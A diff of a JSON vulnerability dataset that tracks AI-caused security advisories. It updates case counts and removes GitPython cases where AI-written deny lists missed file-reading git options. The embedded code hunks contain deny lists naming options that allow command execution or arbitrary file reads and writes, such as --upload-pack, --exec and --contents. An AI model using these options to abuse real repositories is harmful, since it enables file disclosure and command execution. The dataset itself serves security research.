@@ -2,24 +2,24 @@
  "snapshot": {
   "status": "PUBLISHED",
   "case_set": "TP_FUNNEL",
-  "case_count": 273,
-  "ai_root_cause": 215,
+  "case_count": 282,
+  "ai_root_cause": 224,
   "ai_code_flawed": 58,
   "ledger_total": 29593,
   "ledger_reviewed": 2973,
   "ledger_in_progress": 5799,
   "ledger_not_started": 20821,
-  "confirmed_cases": 212,
+  "confirmed_cases": 221,
   "qualified_cases": 61,
   "provisional_cases": 0,
-  "exact_publication_dates": 273,
+  "exact_publication_dates": 282,
   "unknown_publication_dates": 0,
   "date_policy": "GHSA_OR_CVE_PUBLISHED_ONLY",
   "coverage_from": "2025-05-01",
   "coverage_to": "2026-08-26",
   "source_cutoff": "2026-08-26",
-  "generated_at": "2026-09-11T17:23:03Z",
-  "ledger": "artifacts/funnel-account-20260817.jsonl"
+  "generated_at": "2026-09-11T17:55:20Z",
+  "ledger": "neon:ledger_rows"
  },
  "cause_categories": {
   "auth_access": {
@@ -4797,178 +4797,6 @@
    "publication_status": "confirmed"
   },
   {
-   "case_id": "GHSA-5XXX-QHH7-9287",
-   "aliases": [],
-   "repository": "gitpython-developers/gitpython",
-   "repository_metadata": {
-    "full_name": "gitpython-developers/gitpython",
-    "language": "Python",
-    "archived": false
-   },
-   "contribution_class": "AI_INCOMPLETE_REMEDIATION",
-   "candidate_set": [
-    "701ce32fe5ba8cb622c0e0342a376a6beb47d738"
-   ],
-   "carrier_set": [],
-   "minimum_fix_set": [
-    "1b0d2d9b91575f7db44ef4ff58ac37fc9335e5f6"
-   ],
-   "gates": {
-    "identity": "PASS",
-    "ai_hunk": "PASS",
-    "topology": "PASS",
-    "but_for": "PASS",
-    "fix_reversal": "PASS",
-    "release": "PASS",
-    "uniqueness": "PASS"
-   },
-   "vulnerable_release": {
-    "contains_candidate_ancestor": true,
-    "contains_fix_ancestor": false,
-    "kind": "git_tag",
-    "sha": null,
-    "tag": "3.1.58"
-   },
-   "fixed_release": {
-    "contains_fix_ancestor": true,
-    "kind": "git_tag",
-    "sha": null,
-    "tag": "3.1.59"
-   },
-   "published_at": "2026-08-10",
-   "severity": null,
-   "cwes": [],
-   "description": "AI-written option screening added deny lists for archive and revision flags and applied revision checks in iter_commits and blame_incremental, but it defined no blame-specific deny list, so file-reading options reached git blame unscreened. An attacker able to influence those arguments could make the command read an arbitrary file instead of repository content, and the fix closes that route with separate blame and diff deny lists.",
-   "references": [],
-   "mechanism": "The incomplete hardening registered option screens for archive and revision handling but never added a blame-specific deny list, so check_unsafe_options passed contents, revision-file and order-file straight through to git blame. That omission let the command read a file chosen by the caller.",
-   "cause_category": "injection",
-   "ai_provenance": {
-    "family": "openai_gpt_codex",
-    "coverage": "complete",
-    "candidate_count": 1,
-    "named_candidate_count": 1
-   },
-   "fix_authorship": {
-    "classification": "ai_assisted",
-    "families": [
-     "openai_codex"
-    ],
-    "fixes": [
-     {
-      "author": {
-       "email": "sebastian.thiel@icloud.com",
-       "name": "Byron"
-      },
-      "authored_at": "2026-08-05T04:48:36+02:00",
-      "classification": "ai_assisted",
-      "evidence": [
-       {
-        "family": "openai_codex",
-        "kind": "coauthor_trailer",
-        "text": "Co-authored-by: GPT 5.6 <codex@openai.com>"
-       },
-       {
-        "family": "openai_codex",
-        "kind": "explicit_attribution",
-        "text": "Assisted-by: GPT 5.6"
-       }
-      ],
-      "families": [
-       "openai_codex"
-      ],
-      "sha": "1b0d2d9b91575f7db44ef4ff58ac37fc9335e5f6"
-     }
-    ]
-   },
-   "code_evidence": {
-    "fix_marker": null,
-    "candidate_url": "https://github.com/gitpython-developers/gitpython/commit/701ce32fe5ba8cb622c0e0342a376a6beb47d738",
-    "fix_url": "https://github.com/gitpython-developers/gitpython/commit/1b0d2d9b91575f7db44ef4ff58ac37fc9335e5f6",
-    "advisory_url": "https://github.com/advisories/ghsa-5xxx-qhh7-9287",
-    "summary": "AI-written code in Repo.blame contents allowed arbitrary file reads, exposing sensitive files to attackers.",
-    "steps": [
-     {
-      "title": "AI change",
-      "detail": "fix: Guard unsafe git command options (GHSA-956x-8gvw-wg5v)"
-     },
-     {
-      "title": "Fix",
-      "detail": "Block file-reading Git options"
-     }
-    ],
-    "display_hunks": [
-     {
-      "file": "git/repo/base.py",
-      "code": "@@ -161,6 +161,20 @@ class Repo:\n     https://git-scm.com/docs/git-clone#Documentation/git-clone.txt---configltkeygtltvaluegt\n     \"\"\"\n \n+    unsafe_git_archive_options = [\n+        # Allows arbitrary command execution through the remote git-upload-archive command.\n+        \"--exec\",\n+        # Writes output to a caller-controlled filesystem path.\n+        \"--output\",\n+        \"-o\",\n+    ]\n+\n+    unsafe_git_revision_options = [\n+        # This option allows output to be written to arbitrary files before revision parsing.\n+        \"--output\",\n+        \"-o\",\n+    ]\n+\n     # Invariants\n     config_level: ConfigLevels_Tup = (\"system\", \"user\", \"global\", \"repository\")\n     \"\"\"Represents the configuration level of a configuration file.\"\"\"\n@@ -775,6 +789,7 @@ def iter_commits(\n         self,\n         rev: Union[str, Commit, \"SymbolicReference\", None] = None,\n         paths: Union[PathLike, Sequence[PathLike]] = \"\",\n+        allow_unsafe_options: bool = False,\n         **kwargs: Any,\n     ) -> Iterator[Commit]:\n         \"\"\"An iterator of :class:`~git.objects.commit.Commit` objects representing the\n@@ -792,6 +807,9 @@ def iter_commits(\n             Arguments to be passed to :manpage:`git-rev-list(1)`.\n             Common ones are ``max_count`` and ``skip``.\n \n+        :param allow_unsafe_options:\n+            Allow unsafe options in the revision argument, like ``--output``.\n+\n         :note:\n             To receive only commits between two named revisions, use the\n             ``\"revA...revB\"`` revision specifier.\n@@ -802,7 +820,18 @@ def iter_commits(\n         if rev is None:\n             rev = self.head.commit\n \n-        return Commit.iter_items(self, rev, paths, **kwargs)\n+        if not allow_unsafe_options:\n+            Git.check_unsafe_options(\n+                options=Git._option_candidates([rev], kwargs), unsafe_options=self.unsafe_git_revision_options\n+            )\n+\n+        return Commit.iter_items(\n+            self,\n+            rev,\n+            paths,\n+            allow_unsafe_options=allow_unsafe_options,\n+            **kwargs,\n+        )\n \n     def merge_base(self, *rev: TBD, **kwargs: Any) -> List[Commit]:\n         R\"\"\"Find the closest common ancestor for the given revision\n@@ -1079,7 +1108,9 @@ def active_branch(self) -> Head:\n             )\n         return active_branch\n \n-    def blame_incremental(self, rev: str | HEAD | None, file: str, **kwargs: Any) -> Iterator[\"BlameEntry\"]:\n+    def blame_incremental(\n+        self, rev: str | HEAD | None, file: str, allow_unsafe_options: bool = False, **kwargs: Any\n+    ) -> Iterator[\"BlameEntry\"]:\n         \"\"\"Iterator for blame information for the given file at the given revision.\n \n         Unlike :meth:`blame`, this does not return the actual file's contents, only a\n@@ -1090,6 +1121,9 @@ def blame_incremental(self, rev: str | HEAD | None, file: str, **kwargs: Any) ->\n             uncommitted changes. Otherwise, anything successfully parsed by\n             :manpage:`git-rev-parse(1)` is a valid option.\n \n+        :param allow_unsafe_options:\n+            Allow unsafe options in revision argument, like ``--output``.\n+\n         :return:\n             Lazy iterator of :class:`BlameEntry` tuples, where the commit indicates the\n             commit to blame for the line, and range indicates a span of line numbers in\n@@ -1098,6 +1132,10 @@ def blame_incremental(self, rev: str | HEAD | None, file: str, **kwargs: Any) ->\n         If you combine all line number ranges outputted by this command, you should get\n         a continuous range spanning all line numbers in the file.\n         \"\"\"\n+        if not allow_unsafe_options:\n+            Git.check_unsafe_options(\n+                options=Git._option_candidates([rev], kwargs), unsafe_options=self.unsafe_git_revision_options\n+            )\n \n         data: bytes = self.git.blame(rev, \"--\", file, p=True, incremental=True, stdout_as_string=False, **kwargs)",
-      "annotation": "Introduces deny lists for archive and revision options and applies revision checks in iter_commits and blame_incremental, but no blame-specific list exists yet, leaving file-reading flags outside those screens.",
-      "role": "candidate"
-     },
-     {
-      "file": "git/remote.py",
-      "code": "@@ -1071,7 +1071,10 @@ def fetch(\n                     Git.check_unsafe_protocols(ref)\n \n         if not allow_unsafe_options:\n-            Git.check_unsafe_options(options=list(kwargs.keys()), unsafe_options=self.unsafe_git_fetch_options)\n+            Git.check_unsafe_options(\n+                options=Git._option_candidates([], kwargs),\n+                unsafe_options=self.unsafe_git_fetch_options,\n+            )\n \n         proc = self.repo.git.fetch(\n             \"--\", self, *args, as_process=True, with_stdout=False, universal_newlines=True, v=verbose, **kwargs\n@@ -1125,7 +1128,10 @@ def pull(\n                 Git.check_unsafe_protocols(ref)\n \n         if not allow_unsafe_options:\n-            Git.check_unsafe_options(options=list(kwargs.keys()), unsafe_options=self.unsafe_git_pull_options)\n+            Git.check_unsafe_options(\n+                options=Git._option_candidates([], kwargs),\n+                unsafe_options=self.unsafe_git_pull_options,\n+            )\n \n         proc = self.repo.git.pull(\n             \"--\", self, refspec, with_stdout=False, as_process=True, universal_newlines=True, v=True, **kwargs\n@@ -1198,7 +1204,10 @@ def push(\n                 Git.check_unsafe_protocols(ref)\n \n         if not allow_unsafe_options:\n-            Git.check_unsafe_options(options=list(kwargs.keys()), unsafe_options=self.unsafe_git_push_options)\n+            Git.check_unsafe_options(\n+                options=Git._option_candidates([], kwargs),\n+                unsafe_options=self.unsafe_git_push_options,\n+            )\n \n         proc = self.repo.git.push(\n             \"--\",",
-      "annotation": "Switches the fetch, pull, and push option screens to derive candidates from keyword values as well as key names, so options smuggled through keyword arguments no longer bypass those checks.",
-      "role": "candidate"
-     },
-     {
-      "file": "git/cmd.py",
-      "code": "@@ -649,6 +649,11 @@ class Git(metaclass=_GitMeta):\n \n     re_unsafe_protocol = re.compile(r\"(.+)::.+\")\n \n+    unsafe_git_ls_remote_options = [\n+        # This option allows arbitrary command execution in git-ls-remote.\n+        \"--upload-pack\",\n+    ]\n+\n     def __getstate__(self) -> Dict[str, Any]:\n         return slots_to_dict(self, exclude=self._excluded_)\n \n@@ -1022,6 +1027,20 @@ def check_unsafe_options(cls, options: List[str], unsafe_options: List[str]) ->\n                         f\"{unsafe_option} is not allowed, use `allow_unsafe_options=True` to allow it.\"\n                     )\n \n+    @classmethod\n+    def _option_candidates(cls, args: Sequence[Any] = (), kwargs: Optional[Mapping[str, Any]] = None) -> List[str]:\n+        \"\"\"Collect possible option spellings before command-line transformation.\"\"\"\n+        options = [\n+            option for option in cls._unpack_args([arg for arg in args if arg is not None]) if option.startswith(\"-\")\n+        ]\n+        if kwargs:\n+            for key, value in kwargs.items():\n+                values = value if isinstance(value, (list, tuple)) else (value,)\n+                if any(value is True or (value is not False and value is not None) for value in values):\n+                    key = str(key)\n+                    options.append(f\"-{key}\" if len(key) == 1 else f\"--{dashify(key)}\")\n+        return options\n+\n     AutoInterrupt: TypeAlias = _AutoInterrupt\n \n     CatFileContentStream: TypeAlias = _CatFileContentStream\n@@ -1079,6 +1098,22 @@ def set_persistent_git_options(self, **kwargs: Any) -> None:\n \n         self._persistent_git_options = self.transform_kwargs(split_single_char_options=True, **kwargs)\n \n+    def ls_remote(\n+        self,\n+        *args: Any,\n+        allow_unsafe_options: bool = False,\n+        **kwargs: Any,\n+    ) -> Union[str, bytes, Tuple[int, Union[str, bytes], str], \"Git.AutoInterrupt\"]:\n+        \"\"\"List references in a remote repository.\n+\n+        :param allow_unsafe_options:\n+            Allow unsafe options, like ``--upload-pack``.\n+        \"\"\"\n+        if not allow_unsafe_options:\n+            candidate_options = self._option_candidates(args, kwargs)\n+            Git.check_unsafe_options(options=candidate_options, unsafe_options=self.unsafe_git_ls_remote_options)\n+        return self._call_process(\"ls_remote\", *args, **kwargs)\n+\n     @property\n     def working_dir(self) -> Union[None, PathLike]:\n         \"\"\":return: Git directory we are working on\"\"\"\n@@ -1585,7 +1620,7 @@ def transform_kwargs(self, split_single_char_options: bool = True, **kwargs: Any\n         return args\n \n     @classmethod\n-    def _unpack_args(cls, arg_list: Sequence[str]) -> List[str]:\n+    def _unpack_args(cls, arg_list: Sequence[Any]) -> List[str]:\n         outlist = []\n         if isinstance(arg_list, (list, tuple)):\n             for arg in arg_list:",
-      "annotation": "Adds the candidate-spelling collector that reconstructs option tokens from positional and keyword arguments, together with a guarded ls_remote wrapper that blocks the upload-pack option by default.",
-      "role": "candidate"
-     },
-     {
-      "file": "git/cmd.py",
-      "code": "@@ -652,6 +652,7 @@ class Git(metaclass=_GitMeta):\n     unsafe_git_ls_remote_options = [\n         # This option allows arbitrary command execution in git-ls-remote.\n         \"--upload-pack\",\n+        \"--exec\",\n     ]\n \n     unsafe_git_pathspec_from_file_options = [\n@@ -976,7 +977,9 @@ def _canonicalize_option_name(cls, option: str) -> str:\n         return dashify(option_tokens[0])\n \n     @classmethod\n-    def check_unsafe_options(cls, options: List[str], unsafe_options: List[str]) -> None:\n+    def check_unsafe_options(\n+        cls, options: List[str], unsafe_options: List[str], clusterable_short_options: str = \"46flnqsv\"\n+    ) -> None:\n         \"\"\"Raise :class:`~git.exc.UnsafeOptionError` for blocked option spellings.\n \n         In addition to exact matches, this rejects abbreviated long options accepted\n@@ -1011,7 +1014,7 @@ def check_unsafe_options(cls, options: List[str], unsafe_options: List[str]) ->\n         # These value-less Git flags can be clustered before another short option\n         # (for example, ``-fuVALUE``). Stop at any other character because it may\n         # begin an attached value, as ``o`` does in the safe option ``-oupstream``.\n-        clusterable_short_options = frozenset(\"46flnqsv\")\n+        clusterable_short_options_set = frozenset(clusterable_short_options)\n         options_are_kwargs = all(not option.startswith(\"-\") for option in options)\n         for option in options:\n             candidate = cls._canonicalize_option_name(option)\n@@ -1028,7 +1031,7 @@ def check_unsafe_options(cls, options: List[str], unsafe_options: List[str]) ->\n                         raise UnsafeOptionError(\n                             f\"{unsafe_option} is not allowed, use `allow_unsafe_options=True` to allow it.\"\n                         )\n-                    if option_char not in clusterable_short_options:\n+                    if option_char not in clusterable_short_options_set:\n                         break\n             if not (option.startswith(\"--\") or (options_are_kwargs and len(candidate) > 1)):\n                 continue\n@@ -1133,7 +1136,7 @@ def ls_remote(\n         \"\"\"List references in a remote repository.\n \n         :param allow_unsafe_options:\n-            Allow unsafe options, like ``--upload-pack``.\n+            Allow unsafe options, like ``--upload-pack`` or ``--exec``.\n         \"\"\"\n         if not allow_unsafe_options:\n             candidate_options = self._option_candidates(args, kwargs)",
-      "annotation": "Adds the server execution flag to the ls-remote deny list and makes the clusterable short-option set configurable, letting each command screen clustered flags against its own safe grammar.",
-      "role": "fix"
-     },
-     {
-      "file": "git/repo/base.py",
-      "code": "@@ -199,6 +199,19 @@ class Repo:\n         \"-o\",\n     ]\n \n+    unsafe_git_blame_options = unsafe_git_revision_options + [\n+        # These options read from arbitrary files and expose their contents through blame output.\n+        \"--contents\",\n+        \"-S\",\n+        \"--ignore-revs-file\",\n+    ]\n+\n+    unsafe_git_diff_options = unsafe_git_revision_options + [\n+        # Reads caller-controlled order patterns from an arbitrary file.\n+        \"-O\",\n+        \"--orderfile\",\n+    ]\n+\n     # Invariants\n     config_level: ConfigLevels_Tup = (\"system\", \"user\", \"global\", \"repository\")\n     \"\"\"Represents the configuration level of a configuration file.\"\"\"\n@@ -1149,7 +1162,7 @@ def blame_incremental(\n             :manpage:`git-rev-parse(1)` is a valid option.\n \n         :param allow_unsafe_options:\n-            Allow unsafe options in revision argument, like ``--output``.\n+            Allow unsafe options in revision argument, like ``--output`` or ``--contents``.\n \n         :return:\n             Lazy iterator of :class:`BlameEntry` tuples, where the commit indicates the\n@@ -1161,7 +1174,9 @@ def blame_incremental(\n         \"\"\"\n         if not allow_unsafe_options:\n             Git.check_unsafe_options(\n-                options=Git._option_candidates([rev], kwargs), unsafe_options=self.unsafe_git_revision_options\n+                options=Git._option_candidates([rev], kwargs),\n+                unsafe_options=self.unsafe_git_blame_options,\n+                clusterable_short_options=\"46bceflnpqstvw\",\n             )\n \n         data: bytes = self.git.blame(rev, \"--\", file, p=True, incremental=True, stdout_as_string=False, **kwargs)\n@@ -1253,7 +1268,7 @@ def blame(\n             :manpage:`git-rev-parse(1)` is a valid option.\n \n         :param allow_unsafe_options:\n-            Allow unsafe options in revision argument, like ``--output``.\n+            Allow unsafe options in revision argument, like ``--output`` or ``--contents``.\n \n         :return:\n             list: [git.Commit, list: [<line>]]\n@@ -1269,7 +1284,8 @@ def blame(\n         if not allow_unsafe_options:\n             Git.check_unsafe_options(\n                 options=Git._option_candidates([rev, rev_opts_list], kwargs),\n-                unsafe_options=self.unsafe_git_revision_options,\n+                unsafe_options=self.unsafe_git_blame_options,\n+                clusterable_short_options=\"46bceflnpqstvw\",\n             )\n         data: bytes = self.git.blame(rev, *rev_opts_list, \"--\", file, p=True, stdout_as_string=False, **kwargs)\n         commits: Dict[str, Commit] = {}",
-      "annotation": "Defines separate blame and diff deny lists so contents, revision-file, and order-file options are screened, closing the route that let blame output reflect files chosen by the caller.",
-      "role": "fix"
-     },
-     {
-      "file": "git/diff.py",
-      "code": "@@ -220,8 +220,8 @@ def diff(\n             to be read and diffed.\n \n         :param allow_unsafe_options:\n-            If ``True``, allow options such as ``--output`` that can write to arbitrary\n-            filesystem paths.\n+            If ``True``, allow options such as ``--output`` and ``-O`` that can write to\n+            or read from arbitrary filesystem paths.\n \n         :param kwargs:\n             Additional arguments passed to :manpage:`git-diff(1)`, such as ``R=True`` to\n@@ -238,7 +238,8 @@ def diff(\n         if not allow_unsafe_options:\n             Git.check_unsafe_options(\n                 options=Git._option_candidates([other], kwargs),\n-                unsafe_options=self.repo.unsafe_git_revision_options,\n+                unsafe_options=self.repo.unsafe_git_diff_options,\n+                clusterable_short_options=\"46abceflmnpqrstuvwzBCDMNRW\",\n             )\n \n         args: List[Union[PathLike, Diffable]] = []",
-      "annotation": "Points the diff guard at the new order-file-aware deny list with a wider clusterable flag set, preventing diff from reading ordering patterns from caller-chosen files.",
-      "role": "fix"
-     }
-    ],
-    "candidate_patch_sha256": "e25cab2e20877458de6a26515a25c3fd6bce0bddaf8edc7cb9b6a7d8f9c4647d",
-    "fix_patch_sha256": "559c2a3b22ddf913f8e46da77b0a73bb79bb1986be9d7af19477e8d3b35e2320",
-    "mechanism": "The incomplete hardening registered option screens for archive and revision handling but never added a blame-specific deny list, so check_unsafe_options passed contents, revision-file and order-file straight through to git blame. That omission let the command read a file chosen by the caller."
-   },
-   "ir_chain": {
-    "original_advisory_ids": [
-     "GHSA-5XXX-QHH7-9287"
-    ],
-    "original_mechanism": "Git blame accepted unsafe file-related revision options.",
-    "original_sink": "GitPython git/repo/base.py Repo.blame option handling",
-    "original_author_kind": "HUMAN",
-    "original_author_name": "Michael Trier",
-    "original_sha": "33ebe7acec14b25c5f84f35a664803fcab2f7781",
-    "unresolved_reason": null,
-    "attempted_remediation": {
-     "candidate_shas": [
-      "701ce32fe5ba8cb622c0e0342a376a6beb47d738"
-     ],
-     "changed": "Added --output and -o to the blame/revision option denylist.",
-     "missed": "Omitted --contents and -S."
-    },
-    "residual_bypass": "The omitted blame options could read an attacker-selected file as blame contents.",
-    "final_closure": {
-     "minimum_fix_shas": [
-      "1b0d2d9b91575f7db44ef4ff58ac37fc9335e5f6"
-     ],
-     "closed": "Added the contents options and positional values to the unsafe-option check."
-    }
-   },
-   "unpatched": null,
-   "advisory_url": "https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-5XXX-QHH7-9287",
-   "publication_issues": [],
-   "publication_status": "confirmed"
-  },
-  {
    "case_id": "GHSA-4FXP-2M36-QV64",
    "aliases": [
     "CVE-2026-59233"
@@ -5120,173 +4948,6 @@
    },
    "unpatched": null,
    "advisory_url": "https://github.com/advisories/ghsa-4fxp-2m36-qv64",
-   "publication_issues": [],
-   "publication_status": "confirmed"
-  },
-  {
-   "case_id": "GHSA-3WXW-XV34-2FRG",
-   "aliases": [],
-   "repository": "gitpython-developers/gitpython",
-   "repository_metadata": {
-    "full_name": "gitpython-developers/gitpython",
-    "language": "Python",
-    "archived": false
-   },
-   "contribution_class": "AI_INCOMPLETE_REMEDIATION",
-   "candidate_set": [
-    "3af0c2516c5e18c829da30338614688f6b69b49c"
-   ],
-   "carrier_set": [],
-   "minimum_fix_set": [
-    "1b0d2d9b91575f7db44ef4ff58ac37fc9335e5f6"
-   ],
-   "gates": {
-    "identity": "PASS",
-    "ai_hunk": "PASS",
-    "topology": "PASS",
-    "but_for": "PASS",
-    "fix_reversal": "PASS",
-    "release": "PASS",
-    "uniqueness": "PASS"
-   },
-   "vulnerable_release": {
-    "kind": "pypi_and_git_tag",
-    "sha": "30be45d786e95023e23c616fec5cbabca861b44c",
-    "tag": "3.1.58"
-   },
-   "fixed_release": {
-    "kind": "pypi_and_git_tag",
-    "sha": "66340d77aab9a7468f4aed3681d4ef1e3c0ec931",
-    "tag": "3.1.59"
-   },
-   "published_at": "2026-08-10",
-   "severity": null,
-   "cwes": [],
-   "description": "AI-written code mishandled TagReference positional file options, leading to a vulnerability with unspecified impact.",
-   "references": [],
-   "mechanism": "AI-written code mishandled TagReference positional file options, leading to a vulnerability with unspecified impact.",
-   "cause_category": "path_link",
-   "ai_provenance": {
-    "family": "openai_gpt_codex",
-    "coverage": "complete",
-    "candidate_count": 1,
-    "named_candidate_count": 1
-   },
-   "fix_authorship": {
-    "classification": "ai_assisted",
-    "families": [
-     "openai_codex"
-    ],
-    "fixes": [
-     {
-      "author": {
-       "email": "sebastian.thiel@icloud.com",
-       "name": "Byron"
-      },
-      "authored_at": "2026-08-05T04:48:36+02:00",
-      "classification": "ai_assisted",
-      "evidence": [
-       {
-        "family": "openai_codex",
-        "kind": "coauthor_trailer",
-        "text": "Co-authored-by: GPT 5.6 <codex@openai.com>"
-       },
-       {
-        "family": "openai_codex",
-        "kind": "explicit_attribution",
-        "text": "Assisted-by: GPT 5.6"
-       }
-      ],
-      "families": [
-       "openai_codex"
-      ],
-      "sha": "1b0d2d9b91575f7db44ef4ff58ac37fc9335e5f6"
-     }
-    ]
-   },
-   "code_evidence": {
-    "advisory_url": "https://github.com/advisories/ghsa-3wxw-xv34-2frg",
-    "candidate_patch_sha256": "13198c760623fd069dddc396615cfd733f8e8df528a2f3a04ae7b4fd5b3a362f",
-    "candidate_url": "https://github.com/gitpython-developers/GitPython/commit/3af0c2516c5e18c829da30338614688f6b69b49c",
-    "display_hunks": [
-     {
-      "annotation": "AI added a checkout-index unsafe-option guard for '--prefix' plus an allow_unsafe_options escape hatch that permits writing files into arbitrary prefix paths.",
-      "code": "--- a/git/index/base.py\n+++ b/git/index/base.py\n@@ -130,6 +130,8 @@ class IndexFile(LazyMixin, git_diff.Diffable, Serializable):\n index directly before operating on it using the git command.\n \"\"\"\n\n+ unsafe_git_checkout_index_options = [\"--prefix\"]\n+\n __slots__ = (\"repo\", \"version\", \"entries\", \"_extension_data\", \"_file_path\")\n\n _VERSION = 2\n@@ -1212,6 +1214,7 @@ class IndexFile(LazyMixin, git_diff.Diffable, Serializable):\n paths: Union[None, Iterable[PathLike]] = None,\n force: bool = False,\n fprogress: Callable = lambda *args: None,\n+ allow_unsafe_options: bool = False,\n **kwargs: Any,\n ) -> Union[None, Iterator[PathLike], Sequence[PathLike]]:\n \"\"\"Check out the given paths or all files from the version known to the index\n@@ -1238,6 +1241,9 @@ class IndexFile(LazyMixin, git_diff.Diffable, Serializable):\n no explicit paths are given. Otherwise progress information will be send\n prior and after a file has been checked out.\n\n+ :param allow_unsafe_options:\n+ Allow unsafe options, such as ``--prefix``.\n+\n :param kwargs:\n Additional arguments to be passed to :manpage:`git-checkout-index(1)`.\n\n@@ -1261,6 +1267,12 @@ class IndexFile(LazyMixin, git_diff.Diffable, Serializable):\n i.e. if you want :manpage:`git-checkout(1)`-like behaviour, use\n ``head.checkout`` instead of ``index.checkout``.\n \"\"\"\n+ if not allow_unsafe_options:\n+ Git.check_unsafe_options(\n+ options=Git._option_candidates([], kwargs),\n+ unsafe_options=self.unsafe_git_checkout_index_options,\n+ )\n+\n args = [\"--index\"]\n if force:\n args.append(\"--force\")",
-      "file": "git/index/base.py",
-      "role": "candidate"
-     },
-     {
-      "annotation": "Companion guard blocks '--file'/' -F' tag options that would read a tag message from an attacker-controlled path, sharing the allow_unsafe_options scheme.",
-      "code": "--- a/git/refs/tag.py\n+++ b/git/refs/tag.py\n@@ -16,6 +16,7 @@ from .reference import Reference\n\n from typing import Any, TYPE_CHECKING, Type, Union\n\n+from git.cmd import Git\n from git.types import AnyGitObject, PathLike\n\n if TYPE_CHECKING:\n@@ -42,6 +43,8 @@ class TagReference(Reference):\n\n __slots__ =\n\n+ unsafe_git_tag_options = [\"--file\", \"-F\"]\n+\n _common_default = \"tags\"\n _common_path_default = Reference._common_path_default + \"/\" + _common_default\n\n@@ -92,6 +95,7 @@ class TagReference(Reference):\n reference: Union[str, \"SymbolicReference\"] = \"HEAD\",\n logmsg: Union[str, None] = None,\n force: bool = False,\n+ allow_unsafe_options: bool = False,\n **kwargs: Any,\n ) -> \"TagReference\":\n \"\"\"Create a new tag reference.\n@@ -121,12 +125,21 @@ class TagReference(Reference):\n :param force:\n If ``True``, force creation of a tag even though that tag already exists.\n\n+ :param allow_unsafe_options:\n+ Allow unsafe options, such as ``--file``.\n+\n :param kwargs:\n Additional keyword arguments to be passed to :manpage:`git-tag(1)`.\n\n :return:\n A new :class:`TagReference`.\n \"\"\"\n+ if not allow_unsafe_options:\n+ Git.check_unsafe_options(\n+ options=Git._option_candidates([], kwargs),\n+ unsafe_options=cls.unsafe_git_tag_options,\n+ )\n+\n if \"ref\" in kwargs and kwargs[\"ref\"]:\n reference = kwargs[\"ref\"]\n ",
-      "file": "git/refs/tag.py",
-      "role": "candidate"
-     },
-     {
-      "annotation": "Tests assert -F/--file raise UnsafeOptionError unless allow_unsafe_options is explicitly set.",
-      "code": "--- a/test/test_refs.py\n+++ b/test/test_refs.py\n@@ -23,6 +23,7 @@ from git import (\n SymbolicReference,\n TagReference,\n )\n+from git.exc import UnsafeOptionError\n from git.objects.tag import TagObject\n import git.refs as refs\n from git.util import Actor\n@@ -60,6 +61,18 @@ class TestRefs(TestBase):\n # Check remoteness\n assert Reference(self.rorepo, \"refs/remotes/origin\").is_remote()\n\n+ @with_rw_repo(\"HEAD\")\n+ def test_tag_create_rejects_unsafe_file_options(self, rw_repo):\n+ with tempfile.NamedTemporaryFile(\"w\", encoding=\"utf-8\") as message:\n+ message.write(\"private tag message\")\n+ message.flush()\n+ for index, option in enumerate(({\"F\": message.name}, {\"file\": message.name})):\n+ with self.assertRaises(UnsafeOptionError):\n+ TagReference.create(rw_repo, f\"unsafe-{index}\", **option)\n+\n+ tag = TagReference.create(rw_repo, \"allowed-file\", F=message.name, allow_unsafe_options=True)\n+ self.assertEqual(tag.tag.message, \"private tag message\")\n+\n def test_from_pathlike(self):\n # Should be able to create any reference directly.\n for ref_type in (Reference, Head, TagReference, RemoteReference):",
-      "file": "test/test_refs.py",
-      "role": "candidate"
-     },
-     {
-      "annotation": "Fix points the checkout-index guard at unsafe_git_diff_options with an explicit clusterable short-option set, closing a gap where file-reading options could slip through.",
-      "code": "--- a/git/index/base.py\n+++ b/git/index/base.py\n@@ -1567,7 +1567,8 @@ class IndexFile(LazyMixin, git_diff.Diffable, Serializable):\n if not allow_unsafe_options:\n Git.check_unsafe_options(\n options=Git._option_candidates([other], kwargs),\n- unsafe_options=self.repo.unsafe_git_revision_options,\n+ unsafe_options=self.repo.unsafe_git_diff_options,\n+ clusterable_short_options=\"46abceflmnpqrstuvwzBCDMNRW\",\n )\n\n # Only run if we are the default repository index.",
-      "file": "git/index/base.py",
-      "role": "fix"
-     }
-    ],
-    "fix_marker": null,
-    "fix_patch_sha256": "7419f5aa8c4a5e4a7daab4484f167669951d9ad8076dbebfd821eb3949aea862",
-    "fix_url": "https://github.com/gitpython-developers/GitPython/commit/1b0d2d9b91575f7db44ef4ff58ac37fc9335e5f6",
-    "annotation_mode": "hunk_specific",
-    "required_anchors": {
-     "candidate": [
-      "test_tag_create_rejects_unsafe_file_options",
-      "unsafe_git_checkout_index_options"
-     ],
-     "fix": [
-      "unsafe_git_revision_options",
-      "clusterable_short_options"
-     ]
-    },
-    "steps": [
-     {
-      "detail": "Block unsafe checkout-index and tag file options",
-      "title": "AI change"
-     },
-     {
-      "detail": "Block file-reading Git options",
-      "title": "Fix"
-     }
-    ],
-    "summary": "AI-written code mishandled TagReference positional file options, leading to a vulnerability with unspecified impact."
-   },
-   "ir_chain": {
-    "original_advisory_ids": [
-     "GHSA-3F7W-8RR8-F37F"
-    ],
-    "original_mechanism": "TagReference.create accepted dangerous file options supplied through keyword arguments.",
-    "original_sink": "GitPython git/refs/tag.py TagReference.create option handling",
-    "original_author_kind": "HUMAN",
-    "original_author_name": "Sebastian Thiel",
-    "original_sha": "1047b41e2e925617474e2e7c9927314f71ce7365",
-    "unresolved_reason": null,
-    "attempted_remediation": {
-     "candidate_shas": [
-      "3af0c2516c5e18c829da30338614688f6b69b49c"
-     ],
-     "changed": "Added a denylist for --file and -F options passed through keyword arguments.",
-     "missed": "Did not inspect the positional reference and path arguments."
-    },
-    "residual_bypass": "A positional argument could still carry --file and select an attacker-controlled file.",
-    "final_closure": {
-     "minimum_fix_shas": [
-      "1b0d2d9b91575f7db44ef4ff58ac37fc9335e5f6"
-     ],
-     "closed": "Passed positional path and reference values through the same unsafe-option candidate check."
-    }
-   },
-   "unpatched": null,
-   "advisory_url": "https://github.com/gitpython-developers/gitpython/security/advisories/GHSA-3WXW-XV34-2FRG",
    "publication_issues": [],
    "publication_status": "confirmed"
   },
@@ -6250,6 +5911,155 @@
    "publication_status": "qualified"
   },
   {
+   "case_id": "GHSA-P538-C434-8V24",
+   "aliases": [],
+   "repository": "gitpython-developers/gitpython",
+   "repository_metadata": {
+    "full_name": "gitpython-developers/gitpython",
+    "language": "Python",
+    "archived": false
+   },
+   "contribution_class": "AI_INCOMPLETE_REMEDIATION",
+   "candidate_set": [
